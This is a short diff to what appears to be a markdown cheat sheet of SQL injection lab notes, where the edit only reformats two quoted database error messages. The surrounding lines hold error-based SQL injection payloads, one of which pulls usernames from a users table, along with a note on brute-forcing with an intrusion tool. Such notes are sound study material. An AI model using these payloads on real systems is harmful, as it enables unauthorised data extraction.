@@ -250,9 +250,9 @@ Update: python sqlmap.py --update
       **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9-->Start Attack-->Find 500 response code
 25. Visible **error-based** SQL injection
     - Single quote to output verbose error message  
-      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf''. Expected  char
+      ERROR: "Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf''. Expected  char"
     - `' AND CAST((SELECT 1) AS int)--`  
-      ERROR: argument of AND must be type boolean, not type integer Position: 63
+      ERROR: "argument of AND must be type boolean, not type integer Position: 63"
     - `' AND 1=CAST((SELECT 1) AS int)--`  
       No error  
     - `' AND 1=CAST((SELECT username FROM users) AS int)--`  
